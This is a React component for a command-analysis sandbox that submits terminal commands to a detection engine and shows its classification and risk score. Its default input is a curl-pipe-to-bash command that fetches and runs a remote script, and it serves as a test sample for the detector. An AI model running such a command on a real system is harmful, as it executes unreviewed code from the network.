import { FormEvent, useState } from 'react';
import { Play, ShieldAlert, Terminal, AlertTriangle, CheckCircle2, Info } from 'lucide-react';
import { API_URL } from './config';

interface AnalysisResult {
  command: string;
  classification: string;
  risk_score: number;
  matched_rules: string[];
  ml_confidence: number;
  explanation: string;
}

export function CommandSandbox() {
  const [command, setCommand] = useState('curl http://example.com/script.sh | bash');
  const [result, setResult] = useState<AnalysisResult | null>(null);
  const [error, setError] = useState('');
  const [isRunning, setIsRunning] = useState(false);

  const analyze = async (event: FormEvent) => {
    event.preventDefault();
    if (!command.trim()) return;

    setIsRunning(true);
    setError('');
    try {
      const sessionToken = window.localStorage.getItem('aegix_session_token');
      const url = new URL(`${API_URL}/analyze`);
      if (sessionToken) url.searchParams.set('session_token', sessionToken);

      const response = await fetch(url.toString(), {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ command }),
      });
      if (!response.ok) throw new Error(`Analysis failed (${response.status})`);
      setResult(await response.json());
    } catch (analysisError) {
      setError(analysisError instanceof Error ? analysisError.message : 'Analysis failed');
    } finally {
      setIsRunning(false);
    }
  };

  return (
    <div className="settings-container">
      <div className="settings-header">
        <h2 style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
          <Terminal size={24} style={{ color: 'var(--accent-primary)' }} />
          Command Sandbox
        </h2>
        <p>Test terminal commands against the Aegix detection engine</p>
      </div>

      <div style={{ display: 'grid', gridTemplateColumns: '1fr', gap: '24px' }}>
        <div className="panel-card">
          <div className="panel-header" style={{ color: 'var(--accent-primary)', padding: '16px 24px' }}>
            <div className="panel-title" style={{ display: 'flex', alignItems: 'center', gap: '8px', fontSize: '15px' }}>
              <Terminal size={18} /> Execute Command Analysis
            </div>
          </div>
          <div style={{ padding: '24px' }}>
            <form onSubmit={analyze} style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
              <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
                <label style={{ fontSize: '12px', color: 'var(--text-secondary)', fontWeight: 600 }}>Command Input</label>
                <div style={{ position: 'relative' }}>
                  <textarea
                    value={command}
                    onChange={(e) => setCommand(e.target.value)}
                    rows={12}
                    spellCheck={false}
                    className="linux-terminal"
                    style={{ 
                      width: '100%', padding: '16px', borderRadius: '6px', 
                      border: '1px solid var(--border-color)', backgroundColor: '#0a0a0c', 
                      color: '#00ff00', fontFamily: 'monospace', fontSize: '14px',
                      resize: 'vertical',
                      outline: 'none',
                      caretColor: '#00ff00',
                      lineHeight: '1.5'
                    }}
                  />
                </div>
              </div>
              <div style={{ display: 'flex', justifyContent: 'flex-end' }}>
                <button 
                  type="submit" 
                  className="btn-cyan" 
                  disabled={isRunning || !command.trim()}
                  style={{ display: 'flex', alignItems: 'center', gap: '8px' }}
                >
                  <Play size={16} />
                  {isRunning ? 'Analyzing...' : 'Analyze Command'}
                </button>
              </div>
            </form>

            {error && (
              <div style={{ marginTop: '16px', padding: '12px', backgroundColor: 'var(--status-malicious-bg)', color: 'var(--status-malicious)', borderRadius: '6px', fontSize: '13px', display: 'flex', alignItems: 'center', gap: '8px' }}>
                <AlertTriangle size={16} />
                {error}
              </div>
            )}
          </div>
        </div>

        {result && (
          <div className="panel-card" style={{ animation: 'fadeIn 0.3s ease-out' }}>
            <div className="panel-header" style={{ padding: '16px 24px' }}>
              <div className="panel-title" style={{ display: 'flex', alignItems: 'center', gap: '8px', fontSize: '15px' }}>
                <ShieldAlert size={18} /> Analysis Result
              </div>
            </div>
            <div style={{ padding: '24px' }}>
              <div style={{ 
                display: 'flex', justifyContent: 'space-between', alignItems: 'center', 
                padding: '16px', borderRadius: '8px', marginBottom: '20px',
                backgroundColor: result.classification === 'malicious' ? 'var(--status-malicious-bg)' : 
                                 result.classification === 'suspicious' ? 'var(--status-suspicious-bg)' : 
                                 'var(--status-safe-bg)',
                border: `1px solid ${result.classification === 'malicious' ? 'var(--status-malicious)' : 
                                   result.classification === 'suspicious' ? 'var(--status-suspicious)' : 
                                   'var(--status-safe)'}`
              }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
                  {result.classification === 'malicious' && <ShieldAlert size={24} style={{ color: 'var(--status-malicious)' }} />}
                  {result.classification === 'suspicious' && <AlertTriangle size={24} style={{ color: 'var(--status-suspicious)' }} />}
                  {result.classification === 'safe' && <CheckCircle2 size={24} style={{ color: 'var(--status-safe)' }} />}
                  <div>
                    <div style={{ fontSize: '11px', textTransform: 'uppercase', fontWeight: 700, color: 'var(--text-secondary)' }}>Classification</div>
                    <div style={{ fontSize: '18px', fontWeight: 600, textTransform: 'capitalize', color: 'var(--text-primary)' }}>{result.classification}</div>
                  </div>
                </div>
                <div style={{ textAlign: 'right' }}>
                  <div style={{ fontSize: '11px', textTransform: 'uppercase', fontWeight: 700, color: 'var(--text-secondary)' }}>Risk Score</div>
                  <div style={{ fontSize: '24px', fontWeight: 700, color: 'var(--text-primary)', fontFamily: 'var(--font-tech)' }}>{result.risk_score.toFixed(1)}</div>
                </div>
              </div>
              
              <div style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
                <div>
                  <div style={{ fontSize: '12px', fontWeight: 600, color: 'var(--text-secondary)', marginBottom: '8px', display: 'flex', alignItems: 'center', gap: '6px' }}><Info size={14} /> Explanation</div>
                  <p style={{ fontSize: '14px', lineHeight: 1.5, color: 'var(--text-primary)', margin: 0, padding: '12px', backgroundColor: 'var(--bg-main)', borderRadius: '6px', border: '1px solid var(--border-color)' }}>
                    {result.explanation}
                  </p>
                </div>
                
                <div>
                  <div style={{ fontSize: '12px', fontWeight: 600, color: 'var(--text-secondary)', marginBottom: '8px' }}>Matched Rules</div>
                  <div style={{ display: 'flex', flexWrap: 'wrap', gap: '8px' }}>
                    {result.matched_rules.length > 0 ? (
                      result.matched_rules.map((rule) => (
                        <div key={rule} className="badge" style={{ backgroundColor: 'var(--bg-main)', border: '1px solid var(--border-color)', padding: '6px 12px', fontSize: '12px' }}>
                          {rule}
                        </div>
                      ))
                    ) : (
                      <span style={{ fontSize: '13px', color: 'var(--text-secondary)', fontStyle: 'italic' }}>No specific rules matched.</span>
                    )}
                  </div>
                </div>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
